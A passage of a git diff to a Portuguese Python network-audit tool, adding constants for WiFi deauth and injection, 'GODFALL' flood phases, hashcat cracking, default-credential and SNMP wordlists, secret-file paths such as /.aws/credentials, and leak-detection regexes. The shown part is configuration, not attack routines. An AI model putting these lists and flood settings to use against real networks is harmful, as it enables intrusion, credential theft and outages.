@@ -84,10 +84,40 @@ try:
 except ImportError:
     HAS_NMAP = False
 
+# Scapy é opcional (raw ARP/SYN/802.11 quando --root está ativo)
+try:
+    from scapy.all import (ARP, Ether, ICMP, IP, TCP, UDP, RadioTap,
+                            Dot11, Dot11Deauth, Dot11ProbeReq, Dot11Beacon,
+                            Dot11Elt, conf as scapy_conf, sniff, srp, sr1, send, sendp)
+    HAS_SCAPY = True
+except Exception:
+    HAS_SCAPY = False
+
+# Dashboard C2 ao vivo (--live): Flask + SocketIO opcionais
+try:
+    from flask import Flask, jsonify, request as flask_request
+    from flask_socketio import SocketIO
+    HAS_FLASK = True
+except Exception:
+    HAS_FLASK = False
+
+# PDF report final (módulo --god)
+try:
+    from reportlab.lib.pagesizes import A4
+    from reportlab.lib import colors as rl_colors
+    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+    from reportlab.lib.units import cm
+    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
+                                     Table as RLTable, TableStyle, PageBreak)
+    HAS_REPORTLAB = True
+except Exception:
+    HAS_REPORTLAB = False
+
 # ═══════════════════════ CONSTANTS ════════════════════════════
-VERSION = "1.0.0"
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/SEU_USER/SEU_REPO/main/NetDroid.py"
-GITHUB_VERSION_URL = "https://raw.githubusercontent.com/SEU_USER/SEU_REPO/main/VERSION"
+VERSION = "1.4.0"
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/NetDroid.py"
+GITHUB_VERSION_URL = "https://raw.githubusercontent.com/yamotoz/NetDroid/main/VERSION"
+HAS_NMAP_BIN = bool(shutil.which("nmap"))
 NETBIOS_MESSAGE = "O relogio bate as 4"
 DEFAULT_SCAN_MODE = "normal"
 STRESS_MAX_DURATION = 300
@@ -95,7 +125,120 @@ CONCURRENT_LIMIT = 500
 PING_TIMEOUT = 1
 SCAN_TIMEOUT = 2
 BANNER_TIMEOUT = 3
+GODFALL_ATTEMPTS = 160
+GODFALL_ATTEMPTS_INSANE = 420
+GODFALL_PHASES = [
+    {"name": "OVERDRIVE", "multiplier": 2.60, "concurrency": 256, "delay": 0.001, "barrage": 2},
+    {"name": "TITANFALL", "multiplier": 3.50, "concurrency": 384, "delay": 0.000, "barrage": 3},
+]
+GODFALL_PHASES_INSANE = [
+    {"name": "OVERDRIVE", "multiplier": 3.60, "concurrency": 384, "delay": 0.001, "barrage": 3},
+    {"name": "TITANFALL", "multiplier": 5.00, "concurrency": 512, "delay": 0.000, "barrage": 4},
+]
+GODFALL_BARRAGE_THREADS_PER_TIER = 28
+GODFALL_BARRAGE_PORTS = [80, 443, 53, 8080, 8443, 22, 5060, 1900, 137, 5353, 161, 123, 7, 19]
+GODFALL_TCP_SWARM_PER_TIER = 64
+GODFALL_ABORT_SUCCESS_PCT = 4.0
+GODFALL_ABORT_LATENCY_MULT = 8.0
+GODFALL_ABORT_LOSS_PCT = 92.0
+GODFALL_RECOVERY_TARGET_MULT = 1.5
+GODFALL_RECOVERY_TIMEOUT_S = 90
+GODFALL_RECOVERY_STABLE_SAMPLES = 6
 IS_WINDOWS = platform.system().lower() == "windows"
+IS_TERMUX = (
+    os.path.isdir("/data/data/com.termux") or
+    os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
+)
+IS_LINUX = (not IS_WINDOWS) and (not IS_TERMUX) and platform.system().lower() == "linux"
+
+# Capabilities detectadas em runtime (binários nativos privilegiados)
+HAS_AIREPLAY = bool(shutil.which("aireplay-ng"))
+HAS_AIRMON   = bool(shutil.which("airmon-ng"))
+HAS_MDK4     = bool(shutil.which("mdk4")) or bool(shutil.which("mdk3"))
+HAS_TCPDUMP  = bool(shutil.which("tcpdump"))
+HAS_IW       = bool(shutil.which("iw"))
+HAS_IWCONFIG = bool(shutil.which("iwconfig"))
+HAS_ARPSCAN  = bool(shutil.which("arp-scan"))
+HAS_IPTABLES = bool(shutil.which("iptables"))
+HAS_NETSH    = bool(shutil.which("netsh"))
+HAS_PKTMON   = bool(shutil.which("pktmon"))
+HAS_POWERSHELL = bool(shutil.which("powershell")) or bool(shutil.which("pwsh"))
+HAS_SU       = bool(shutil.which("su"))
+# Captura/crack WiFi profissional (módulo --live)
+HAS_HCXDUMPTOOL = bool(shutil.which("hcxdumptool"))
+HAS_HCXPCAPNGTOOL = bool(shutil.which("hcxpcapngtool")) or bool(shutil.which("hcxpcaptool"))
+HAS_HASHCAT  = bool(shutil.which("hashcat"))
+HAS_AIRODUMP = bool(shutil.which("airodump-ng"))
+
+# ──────────── Dashboard C2 (--live) constants ───────────────
+DASHBOARD_HOST = "127.0.0.1"
+DASHBOARD_PORT = 5556
+DASHBOARD_SECRET = "netdroid-c2-local"  # local apenas — não exposto à rede
+WORDLIST_DIR = Path("WordList")
+HANDSHAKE_DIR = Path("handshakes")
+HASHCAT_PROFILES = {
+    # nome: workload (1-4) + label visível no dashboard
+    "low":     {"workload": 1, "runtime": 0, "label": "🟢 LOW — silencioso (~30% GPU)"},
+    "medium":  {"workload": 2, "runtime": 0, "label": "🟡 MEDIUM — balanceado (~60% GPU)"},
+    "hard":    {"workload": 3, "runtime": 0, "label": "🟠 HARD — pesado (~90% GPU)"},
+    "insane":  {"workload": 4, "runtime": 0, "label": "🔴 INSANE — 100% GPU descontrolado"},
+}
+
+# Fases godfall apex sob --root: tiers maiores e concorrência elevada
+GODFALL_PHASES_ROOT = [
+    {"name": "OVERDRIVE", "multiplier": 4.20, "concurrency": 512, "delay": 0.001, "barrage": 3},
+    {"name": "TITANFALL", "multiplier": 6.50, "concurrency": 768, "delay": 0.000, "barrage": 5},
+]
+GODFALL_PHASES_ROOT_INSANE = [
+    {"name": "OVERDRIVE", "multiplier": 5.40, "concurrency": 768, "delay": 0.000, "barrage": 4},
+    {"name": "TITANFALL", "multiplier": 8.00, "concurrency": 1024, "delay": 0.000, "barrage": 6},
+]
+# Limite de concorrência elevado quando privilégio detectado
+CONCURRENT_LIMIT_ROOT = 2048
+# Thermal guard (Termux): °C
+THERMAL_LIMITE_REDUZIR = 70.0
+THERMAL_LIMITE_ABORTAR = 80.0
+
+# Wordlist expandida de comunidades SNMP usada no boost --god + --root
+SNMP_COMMUNITIES_ROOT = [
+    "public", "private", "cisco", "admin", "manager", "community",
+    "read", "write", "secret", "default", "0", "router", "guest",
+    "monitor", "snmp", "snmpd", "snmptrap", "system", "all",
+    "snmpv1", "snmpv2", "rmon", "test", "ilmi", "core",
+    "tivoli", "openview", "hp_admin", "security", "OrigEquipMfr",
+    "regional", "office", "private0", "public0", "publi",
+    "Public", "Private", "ADMIN", "ROOT", "fubar",
+]
+
+# ──────────── Drivers Windows que bloqueiam 802.11 injection ──
+# Regex de drivers conhecidos por silenciosamente descartar frames
+# de injection (sendp/scapy) mesmo com NPCAP instalado. Usado pelo
+# pré-check do --kamikase no Windows para alertar antes do ataque.
+DRIVERS_BLOQUEIAM_INJECTION = [
+    (r"Intel.*Wireless.*(AC|AX|BE)\s*\d{3,4}",
+     "Drivers Intel modernos (AC/AX/BE) bloqueiam injection no Windows."),
+    (r"Intel.*Wi-?Fi\s*6",
+     "Intel Wi-Fi 6/6E driver Windows bloqueia injection."),
+    (r"Realtek.*RTL88(21|22|52|53)",
+     "Realtek RTL88xx no Windows bloqueia injection (modo Linux funciona)."),
+    (r"Killer.*Wi-?Fi",
+     "Killer Wi-Fi (rebrand Intel/Qualcomm) bloqueia injection."),
+    (r"Qualcomm.*Atheros.*QCA9\d{3}",
+     "Qualcomm Atheros QCA9xxx recente bloqueia injection no Windows."),
+    (r"MediaTek.*MT76\d{2}",
+     "MediaTek MT76xx no Windows bloqueia injection."),
+    (r"Broadcom.*BCM43",
+     "Broadcom BCM43xx bloqueia injection (Apple/Mac e alguns notebooks)."),
+]
+
+# Drivers/chips que SABIDAMENTE funcionam (whitelist informativa)
+DRIVERS_PERMITEM_INJECTION = [
+    (r"Atheros.*AR9271",          "Atheros AR9271 — clássico, funciona perfeito."),
+    (r"Atheros.*AR9285",          "Atheros AR9285 — driver expõe monitor."),
+    (r"Realtek.*RTL8187",         "Realtek RTL8187 — adapters Alfa antigos."),
+    (r"Ralink.*RT3070",           "Ralink RT3070 — adapters Alfa AWUS036NH."),
+    (r"Realtek.*RTL8812AU",       "Realtek RTL8812AU — Alfa AWUS036ACH."),
+]
 
 # ─────────────────── color palette ────────────────────────────
 C_RED = "#ff003c"    # Cyberpunk Red
@@ -124,27 +267,47 @@ TOP100_PORTS = [7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88, 106,
 IOT_PORTS = [554, 8000, 8080, 8443, 8888, 37777, 34567, 80, 443, 49152]
 
 SERVICE_MAP = {
-    7: "echo", 9: "discard", 13: "daytime", 21: "ftp", 22: "ssh",
-    23: "telnet", 25: "smtp", 37: "time", 53: "dns", 79: "finger",
-    80: "http", 81: "http-alt", 88: "kerberos", 106: "poppassd",
-    110: "pop3", 111: "rpcbind", 113: "ident", 119: "nntp",
-    135: "msrpc", 139: "netbios-ssn", 143: "imap", 179: "bgp",
-    389: "ldap", 443: "https", 445: "microsoft-ds", 465: "smtps",
-    513: "rlogin", 514: "syslog", 515: "printer", 543: "klogin",
-    548: "afp", 554: "rtsp", 587: "submission", 631: "ipp",
-    873: "rsync", 993: "imaps", 995: "pop3s", 1433: "mssql",
-    1723: "pptp", 1900: "upnp", 2049: "nfs", 3000: "grafana",
-    3128: "squid", 3306: "mysql", 3389: "rdp", 5000: "upnp",
-    5060: "sip", 5432: "postgresql", 5631: "pcanywhere",
-    5800: "vnc-http", 5900: "vnc", 6000: "x11", 8000: "http-alt",
-    8008: "http-alt", 8009: "ajp13", 8080: "http-proxy",
-    8081: "http-alt", 8443: "https-alt", 8888: "http-alt",
-    9100: "jetdirect", 9999: "abyss", 10000: "webmin",
-    27017: "mongodb", 6379: "redis", 11211: "memcached",
-    37777: "dahua", 34567: "dahua-alt", 49152: "upnp-nat",
+    7: "echo", 9: "discard", 13: "daytime", 19: "chargen", 21: "ftp", 22: "ssh",
+    23: "telnet", 25: "smtp", 37: "time", 53: "dns", 67: "dhcp", 68: "dhcp",
+    69: "tftp", 79: "finger", 80: "http", 81: "http-alt", 88: "kerberos",
+    102: "iso-tsap", 104: "dicom", 106: "poppassd", 110: "pop3", 111: "rpcbind",
+    113: "ident", 119: "nntp", 123: "ntp", 135: "msrpc", 137: "netbios-ns",
+    138: "netbios-dgm", 139: "netbios-ssn", 143: "imap", 161: "snmp", 162: "snmp-trap",
+    179: "bgp", 389: "ldap", 427: "svrloc", 443: "https", 445: "microsoft-ds",
+    465: "smtps", 502: "modbus", 513: "rlogin", 514: "syslog", 515: "printer",
+    543: "klogin", 548: "afp", 554: "rtsp", 587: "submission", 631: "ipp",
+    636: "ldaps", 666: "doom", 873: "rsync", 902: "vmware", 990: "ftps",
+    993: "imaps", 995: "pop3s", 1080: "socks", 1194: "openvpn", 1433: "mssql",
+    1521: "oracle", 1604: "icabrowser", 1701: "l2tp", 1723: "pptp", 1883: "mqtt",
+    1900: "upnp", 2000: "cisco-sccp", 2049: "nfs", 2082: "cpanel", 2083: "cpanel-ssl",
+    2086: "whm", 2087: "whm-ssl", 2222: "ssh-alt", 2375: "docker", 2376: "docker-tls",
+    2483: "oracle-db", 2484: "oracle-db-ssl", 3000: "grafana", 3128: "squid",
+    3268: "ldap-gc", 3306: "mysql", 3389: "rdp", 3478: "stun", 3690: "svn",
+    4369: "epmd", 4444: "metasploit", 4500: "ipsec-nat", 4567: "tram",
+    4848: "glassfish", 5000: "upnp", 5001: "iperf3", 5005: "rtp",
+    5060: "sip", 5061: "sips", 5222: "xmpp-client", 5269: "xmpp-server",
+    5353: "mdns", 5432: "postgresql", 5555: "freeciv", 5631: "pcanywhere",
+    5683: "coap", 5800: "vnc-http", 5900: "vnc", 5984: "couchdb",
+    6000: "x11", 6379: "redis", 6443: "kubernetes", 6660: "irc",
+    6667: "irc", 6881: "bittorrent", 7000: "afs3-fileserver", 7001: "weblogic",
+    7077: "spark", 7547: "tr-069", 7657: "i2p", 8000: "http-alt",
+    8008: "http-alt", 8009: "ajp13", 8080: "http-proxy", 8081: "http-alt",
+    8086: "influxdb", 8088: "hadoop", 8089: "splunk", 8090: "atlassian",
+    8091: "couchbase", 8123: "home-assistant", 8200: "vault", 8333: "bitcoin",
+    8443: "https-alt", 8500: "consul", 8554: "rtsp-alt", 8649: "ganglia",
+    8883: "mqtts", 8888: "http-alt", 9000: "php-fpm", 9042: "cassandra",
+    9090: "prometheus", 9091: "transmission", 9092: "kafka", 9100: "jetdirect",
+    9200: "elasticsearch", 9418: "git", 9999: "abyss", 10000: "webmin",
+    11211: "memcached", 15672: "rabbitmq", 16992: "intel-amt", 17500: "dropbox",
+    19999: "netdata", 25565: "minecraft", 27015: "source-engine", 27017: "mongodb",
+    32400: "plex", 32768: "rpc", 34567: "dahua-alt", 37777: "dahua",
+    44818: "ethernetip", 47808: "bacnet", 49152: "upnp-nat", 50000: "sap",
+    50070: "hadoop-hdfs", 51820: "wireguard", 54321: "supercollider",
+    61616: "activemq", 62078: "lockdownd-ios",
 }
 
 # ─────────────── MAC vendor prefix (offline) ─────────────────
+# Base ampliada de fabricantes (140+ prefixos OUI) — cobertura militar
 MAC_VENDORS = {
     "00:1A:2B": "Ayecom", "00:50:56": "VMware", "00:0C:29": "VMware",
     "00:1C:42": "Parallels", "08:00:27": "VirtualBox",
@@ -182,6 +345,62 @@ MAC_VENDORS = {
     "48:46:FB": "Huawei", "CC:A2:23": "Huawei",
     "7C:B0:C2": "Intel", "00:26:18": "ASUSTek",
     "F8:1A:67": "TP-Link", "18:A6:F7": "TP-Link",
+    # Xiaomi / Redmi
+    "28:6C:07": "Xiaomi", "34:CE:00": "Xiaomi", "50:8F:4C": "Xiaomi",
+    "64:09:80": "Xiaomi", "78:11:DC": "Xiaomi", "8C:BE:BE": "Xiaomi",
+    "98:FA:E3": "Xiaomi", "F4:8B:32": "Xiaomi",
+    # Tenda
+    "C8:3A:35": "Tenda", "50:2B:73": "Tenda", "08:57:00": "Tenda",
+    # ZTE
+    "00:1E:73": "ZTE", "34:37:59": "ZTE", "DC:02:8E": "ZTE",
+    "F4:6D:E2": "ZTE",
+    # Google / Nest
+    "F4:F5:D8": "Google", "1C:F2:9A": "Google", "20:DF:B9": "Google",
+    "64:16:66": "Google-Nest",
+    # Amazon / Echo
+    "44:65:0D": "Amazon", "F0:27:2D": "Amazon", "FC:65:DE": "Amazon",
+    "B0:FC:0D": "Amazon",
+    # Sony
+    "00:24:BE": "Sony", "FC:0F:E6": "Sony", "78:84:3C": "Sony",
+    # LG
+    "00:1F:6B": "LG", "C4:36:6C": "LG", "E8:5B:5B": "LG",
+    # Netgear
+    "00:09:5B": "Netgear", "20:E5:2A": "Netgear", "C4:04:15": "Netgear",
+    "9C:C9:EB": "Netgear", "A0:40:A0": "Netgear",
+    # Aruba
+    "00:1A:1E": "Aruba", "20:4C:03": "Aruba", "94:B4:0F": "Aruba",
+    # Ruckus
+    "00:13:92": "Ruckus", "8C:7A:15": "Ruckus", "E0:10:7F": "Ruckus",
+    # Ubiquiti
+    "24:A4:3C": "Ubiquiti", "44:D9:E7": "Ubiquiti", "78:8A:20": "Ubiquiti",
+    "DC:9F:DB": "Ubiquiti", "E0:63:DA": "Ubiquiti", "FC:EC:DA": "Ubiquiti",
+    # Roku
+    "AC:3A:7A": "Roku", "B0:A7:37": "Roku", "CC:6D:A0": "Roku",
+    # Sonos
+    "00:0E:58": "Sonos", "78:28:CA": "Sonos", "B8:E9:37": "Sonos",
+    # Wyze / Eufy
+    "2C:AA:8E": "Wyze", "7C:78:B2": "Wyze", "8C:85:80": "Eufy",
+    # Synology / QNAP
+    "00:11:32": "Synology", "24:5E:BE": "QNAP",
+    # Roteadores extras / IoT
+    "00:1D:7E": "Cisco-Linksys", "00:25:9C": "Cisco-Linksys",
+    "00:18:39": "Cisco-Linksys", "00:21:91": "D-Link", "00:0F:3D": "D-Link",
+    # Impressoras
+    "00:00:F0": "Samsung-Printer", "00:03:7F": "Brother", "08:00:46": "Sony",
+    "00:80:77": "Brother", "00:1B:A9": "Brother",
+    "00:00:48": "Epson", "44:D8:84": "Epson", "A4:EE:57": "Epson",
+    "30:CD:A7": "HP", "F4:CE:46": "HP", "9C:8E:99": "HP",
+    "00:C0:EE": "Kyocera",
+    # Câmeras IP extras
+    "00:11:13": "Axis", "00:40:8C": "Axis", "AC:CC:8E": "Axis",
+    "00:0F:7C": "Foscam", "8C:E7:48": "Foscam",
+    "EC:71:DB": "Reolink", "94:E1:AC": "Reolink",
+    "AC:CF:23": "Amcrest",
+    # VoIP / SIP
+    "00:0B:82": "Grandstream", "C0:74:AD": "Grandstream",
+    # Mobile / IoT extra
+    "00:25:00": "Apple", "F0:18:98": "Apple", "AC:CF:5C": "Apple",
+    "00:23:6C": "Apple", "BC:52:B7": "Apple",
 }
 
 # ──────────── default credentials database ────────────────────
@@ -198,17 +417,844 @@ DEFAULT_CREDS = {
     "linksys": [("admin", "admin"), ("", "admin")],
     "cisco": [("cisco", "cisco"), ("admin", "admin")],
     "huawei": [("admin", "admin"), ("telecomadmin", "admintelecom")],
+    "xiaomi": [("admin", "admin"), ("admin", "1234"), ("root", "root")],
+    "tenda": [("admin", "admin"), ("admin", "")],
+    "zte": [("admin", "admin"), ("user", "user"), ("admin", "Zte521")],
+    "ubiquiti": [("ubnt", "ubnt"), ("admin", "admin")],
+    "axis": [("root", "pass"), ("admin", "admin")],
+    "foscam": [("admin", ""), ("admin", "admin")],
+    "reolink": [("admin", ""), ("admin", "admin")],
+    "amcrest": [("admin", "admin"), ("admin", "")],
+    "netgear": [("admin", "password"), ("admin", "1234"), ("admin", "admin")],
+    "synology": [("admin", ""), ("admin", "admin")],
+    "qnap": [("admin", "admin")],
+    "intelbras": [("admin", "admin"), ("admin", "1234")],
+    "fortinet": [("admin", "")],
 }
 
-# ────────────── RTSP paths to test ───────────────────────────
-RTSP_PATHS = ["/live", "/stream", "/ch01", "/video1", "/cam/realmonitor",
-              "/Streaming/Channels/101", "/live/ch00_0", "/h264",
-              "/mpeg4", "/channel1", "/media/video1", "/11", "/12"]
+# ────────────── RTSP paths para testar ───────────────────────
+# Caminhos comuns por fabricante (35+) — usados na descoberta defensiva
+RTSP_PATHS = [
+    "/live", "/stream", "/stream1", "/stream2", "/ch01", "/ch1", "/ch01.264",
+    "/video1", "/video.h264", "/cam/realmonitor", "/cam/realmonitor?channel=1&subtype=0",
+    "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/1",
+    "/live/ch00_0", "/live/ch01_0", "/h264", "/h264_stream", "/h264Preview_01_main",
+    "/mpeg4", "/MediaInput/h264", "/channel1", "/channel2", "/media/video1",
+    "/media/video2", "/11", "/12", "/onvif1", "/onvif2",
+    "/axis-media/media.amp", "/mjpg/video.mjpg", "/videoMain", "/videoSub",
+    "/user=admin&password=&channel=1&stream=0.sdp", "/PSIA/Streaming/channels/1",
+    "/user.sdp", "/play1.sdp", "/play2.sdp",
+]
 
-# ────────────── API endpoints to probe ────────────────────────
-API_ENDPOINTS = ["/api/", "/cgi-bin/", "/admin/", "/login", "/status",
-                 "/config.xml", "/deviceinfo", "/system", "/info",
-                 "/ISAPI/System/deviceInfo", "/common/info.cgi"]
+# ────────────── API endpoints para sondar ────────────────────
+# 30+ endpoints comuns em routers, NVRs, NAS, IoT e câmeras IP
+API_ENDPOINTS = [
+    "/api/", "/api/v1/", "/api/v1/status", "/v1/", "/v2/",
+    "/cgi-bin/", "/cgi-bin/config.cgi", "/cgi-bin/luci",
+    "/admin/", "/admin/login", "/login", "/status", "/info",
+    "/config.xml", "/deviceinfo", "/system", "/system.xml",
+    "/graphql", "/swagger.json", "/swagger-ui.html", "/openapi.json",
+    "/ISAPI/System/deviceInfo", "/PSIA/System/deviceInfo",
+    "/common/info.cgi", "/onvif/device_service",
+    "/axis-cgi/", "/axis-cgi/admin/serverreport.cgi",
+    "/Synology/", "/webman/index.cgi", "/qts/", "/cgi-bin/quick.html",
+    "/.git/config", "/.env", "/phpmyadmin/", "/wp-admin/",
+    "/manager/html", "/server-status", "/server-info",
+    "/cmd.php", "/setup.cgi", "/HNAP1/",
+]
+
+# ──────────── Caça a segredos (paths críticos passivos) ──────
+# Paths que costumam vazar credenciais/configs/backups quando expostos.
+# São sondados via GET (read-only) e o body é inspecionado por LEAK_PATTERNS.
+SECRET_PATHS = [
+    # Variáveis de ambiente
+    "/.env", "/.env.local", "/.env.production", "/.env.development", "/.env.bak",
+    # Configs de aplicação
+    "/config.json", "/config.yaml", "/config.yml", "/configuration.php",
+    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php~",
+    "/settings.py", "/settings.json", "/local_settings.py",
+    "/credentials.json", "/secrets.json", "/secrets.yaml",
+    # Dumps e backups de banco
+    "/database.sql", "/dump.sql", "/backup.sql", "/db.sql",
+    "/backup.zip", "/backup.tar", "/backup.tar.gz", "/site.zip", "/www.zip",
+    "/db.sqlite", "/db.sqlite3", "/database.sqlite",
+    # Git / VCS
+    "/.git/config", "/.git/HEAD", "/.git/index", "/.gitignore",
+    "/.svn/entries", "/.hg/hgrc",
+    # Auth files
+    "/.htpasswd", "/.htaccess", "/auth.json",
+    # Cloud / SSH
+    "/.aws/credentials", "/.aws/config", "/.ssh/id_rsa", "/.ssh/authorized_keys",
+    "/private.key", "/server.key", "/id_rsa", "/id_dsa",
+    # Package manifests com possíveis tokens
+    "/composer.json", "/package.json", "/.npmrc", "/.pypirc",
+    # Documentação de API que pode listar endpoints internos
+    "/swagger-ui.html", "/swagger.json", "/api-docs", "/openapi.json", "/v2/api-docs",
+    # Diagnóstico
+    "/.DS_Store", "/Thumbs.db", "/phpinfo.php", "/info.php", "/test.php",
+    "/debug", "/debug.log", "/error.log",
+    # Dashboards comuns
+    "/actuator/env", "/actuator/health", "/actuator/heapdump",
+    "/console", "/jmx-console", "/manager/status",
+]
+
+# Regex que indicam vazamento real dentro do body. Severidade `critica` quando casa.
+LEAK_PATTERNS = [
+    (r"(?i)BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY", "Chave privada exposta"),
+    (r"(?i)aws_secret_access_key\s*[:=]\s*['\"]?[A-Za-z0-9/+=]{20,}", "AWS secret access key"),
+    (r"(?i)aws_access_key_id\s*[:=]\s*['\"]?AKIA[0-9A-Z]{16}", "AWS access key id"),
+    (r"(?i)(api[_-]?key|apikey|access[_-]?token|auth[_-]?token)\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}", "API token"),
+    (r"(?i)password\s*[:=]\s*['\"][^'\"\s]{4,}", "Senha em texto plano"),
+    (r"(?i)db[_-]?pass(word)?\s*[:=]\s*['\"][^'\"\s]{4,}", "Senha de banco de dados"),
+    (r"(?i)mysql://[^:]+:[^@]+@", "URI MySQL com credenciais"),
+    (r"(?i)postgres(ql)?://[^:]+:[^@]+@", "URI PostgreSQL com credenciais"),
+    (r"(?i)mongodb(\+srv)?://[^:]+:[^@]+@", "URI MongoDB com credenciais"),
+    (r"\[core\]\s*\n\s*repositoryformatversion", "Arquivo .git/config exposto"),
+    (r"-----BEGIN\s+CERTIFICATE-----", "Certificado exposto"),
+    (r"(?i)xoxb-[A-Za-z0-9-]{20,}", "Slack bot token"),
+    (r"(?i)gh[pousr]_[A-Za-z0-9]{30,}", "GitHub token"),
+    (r"(?i)secret[_-]?key\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}", "Secret key"),
+    (r"(?i)<DB_PASSWORD>|DB_PASSWORD\s*=", "Senha de banco em config"),
+]
+
+# Comunidades SNMP comuns para teste passivo (uma única GetRequest cada).
+SNMP_COMMUNITIES = [
+    "public", "private", "cisco", "admin", "manager", "community",
+    "read", "write", "secret", "default", "0", "router", "guest",
+]
+
+# Padrões de PSK / chave WiFi vazadas em JS de páginas de status de roteador.
+PSK_PATTERNS = [
+    (r'(?i)(?:var|let|const)\s+(?:wifi[_-]?key|wpa[_-]?key|psk|wpapsk|wlan[_-]?passphrase|passphrase|pskvalue)\s*=\s*["\']([^"\']{6,63})["\']',
+     "PSK em variável JS"),
+    (r'(?i)"(?:wifiKey|wpaKey|psk|wpaPassphrase|passPhrase|pskValue)"\s*:\s*"([^"]{6,63})"',
+     "PSK em campo JSON embutido"),
+    (r'(?i)(?:value|defaultvalue)\s*=\s*"([^"]{8,63})"\s+[^>]*(?:id|name)\s*=\s*"(?:wpaPassphrase|psk|wifiKey|wlanKey|passphrase)"',
+     "PSK em input HTML"),
+    (r'(?i)(?:wpa[_-]?key|wifi[_-]?password|wlan[_-]?key)\s*[:=]\s*["\']?([^"\'\s<>]{8,63})',
+     "PSK em chave/valor genérico"),
+]
+
+# ──────────── EXPLICAÇÕES DIDÁTICAS DOS ACHADOS ──────────────
+# Cada chave descreve um TIPO de descoberta. Os relatórios injetam estes
+# blocos para que o leitor (mesmo sem profundo conhecimento técnico)
+# entenda: O QUE É, COMO VALIDAR, IMPACTO e exemplo do que foi encontrado.
+EXPLICACOES: Dict[str, Dict[str, str]] = {
+    # ── Inventário e descoberta ───────────────────────────────
+    "inventario_hosts": {
+        "titulo": "Inventário de Hosts",
+        "resumo": (
+            "Lista de todos os dispositivos detectados na rede. Cada host traz IP, "
+            "MAC, vendor (fabricante via OUI), sistema operacional inferido, "
+            "hostname, tipo de dispositivo (roteador, câmera, impressora, etc.), "
+            "portas abertas e nível de confiança (0–100) baseado em quantas "
+            "técnicas independentes confirmaram cada campo."),
+        "como_validar": (
+            "Cruze o IP com o roteador (página de clientes conectados). "
+            "Confirme o MAC físicamente em equipamentos. Para hostname, faça "
+            "ping pelo nome (`ping nome.local`). Para tipo de dispositivo, "
+            "abra o IP no navegador e confira a interface."),
+        "impacto": (
+            "Saber TUDO que está na rede é o primeiro passo de qualquer auditoria. "
+            "Dispositivos desconhecidos podem ser invasores ou IoT esquecido com "
+            "firmware vulnerável. Hostname/MAC/vendor mostram quem é quem."),
+    },
+    # ── Vulnerabilidades por severidade ───────────────────────
+    "vuln_critica": {
+        "titulo": "Vulnerabilidade CRÍTICA",
+        "resumo": (
+            "Falha conhecida e explorável que permite execução remota de código, "
+            "vazamento de dados em massa ou tomada total do dispositivo, sem "
+            "autenticação ou com credenciais default."),
+        "como_validar": (
+            "Pegue o CVE indicado, busque no NIST NVD (nvd.nist.gov) e cruze a "
+            "versão exata do serviço (banner) com a faixa vulnerável. "
+            "Ferramentas como `searchsploit` mostram se há exploit público. "
+            "NUNCA execute exploit sem autorização."),
+        "impacto": (
+            "Sem correção, é só questão de tempo até alguém entrar. Um atacante "
+            "na mesma rede WiFi pode usar essa falha para virar root no "
+            "dispositivo, sair pela rede interna e se mover lateralmente."),
+    },
+    "vuln_alta": {
+        "titulo": "Vulnerabilidade ALTA",
+        "resumo": (
+            "Problema sério, mas que normalmente exige condição extra "
+            "(autenticação, configuração específica, ou contato com o serviço)."),
+        "como_validar": (
+            "Confira o CVE e leia o `attack vector`: se for `network` e "
+            "`unauthenticated`, trate como crítico. Se exige usuário logado, "
+            "ainda é grave porque combina com phishing/creds default."),
+        "impacto": (
+            "Frequentemente usado em encadeamento (chain): atacante usa uma "
+            "falha pequena para virar usuário, e essa falha alta para virar "
+            "admin. Ignorar é dar meio caminho de graça."),
+    },
+    "vuln_media": {
+        "titulo": "Vulnerabilidade MÉDIA",
+        "resumo": (
+            "Risco moderado: pode levar a vazamento parcial de informação, "
+            "negação de serviço local, ou bypass de controles secundários."),
+        "como_validar": (
+            "Em ambiente de homologação, tente o cenário descrito no CVE. "
+            "Se cair em produção, registre a versão e o patch level."),
+        "impacto": (
+            "Sozinho não derruba o dispositivo, mas dá ao atacante peças do "
+            "quebra-cabeça (versões, paths internos) para preparar ataques "
+            "mais sérios."),
+    },
+    "vuln_info": {
+        "titulo": "Achado Informativo",
+        "resumo": (
+            "Não é uma falha em si — é uma exposição de informação que "
+            "facilita reconhecimento (versão de servidor, headers ausentes, "
+            "banners detalhados)."),
+        "como_validar": (
+            "Confira manualmente: `curl -I http://ip:porta` mostra os headers. "
+            "Compare com baseline da sua organização."),
+        "impacto": (
+            "Cada peça de informação a mais que vaza ajuda o atacante a montar "
+            "um perfil do alvo e escolher exploits específicos."),
+    },
+    # ── Portas/serviços expostos ──────────────────────────────
+    "porta_telnet": {
+        "titulo": "Telnet exposto (porta 23)",
+        "resumo": (
+            "Telnet é um protocolo de terminal remoto SEM CRIPTOGRAFIA. "
+            "Qualquer usuário/senha digitado trafega em texto puro pela rede."),
+        "como_validar": (
+            "Abra um cliente Telnet (`telnet IP 23`). Se aparecer prompt de "
+            "login, está aberto. Quem estiver na mesma rede WiFi pode ler "
+            "tudo com `tcpdump` ou Wireshark."),
+        "impacto": (
+            "Alvo clássico do botnet Mirai e variantes. Combinado com "
+            "credenciais padrão, vira acesso root em segundos. "
+            "Nunca deveria estar aberto em rede moderna."),
+    },
+    "porta_ftp": {
+        "titulo": "FTP exposto (porta 21)",
+        "resumo": (
+            "FTP transfere arquivos e credenciais SEM CRIPTOGRAFIA. "
+            "Muitos servidores FTP têm também a opção `anonymous` que dispensa senha."),
+        "como_validar": (
+            "Tente `ftp IP` e use usuário `anonymous` com senha vazia. "
+            "Se entrar, a pasta está pública. Se pedir senha, ainda é grave "
+            "porque trafega em texto puro."),
+        "impacto": (
+            "Vazamento de arquivos sensíveis (backups, configs) e captura "
+            "trivial de credenciais por sniffing. Substitua por SFTP (porta 22)."),
+    },
+    "porta_smb": {
+        "titulo": "SMB exposto (porta 445/139)",
+        "resumo": (
+            "SMB compartilha arquivos e impressoras em redes Windows. "
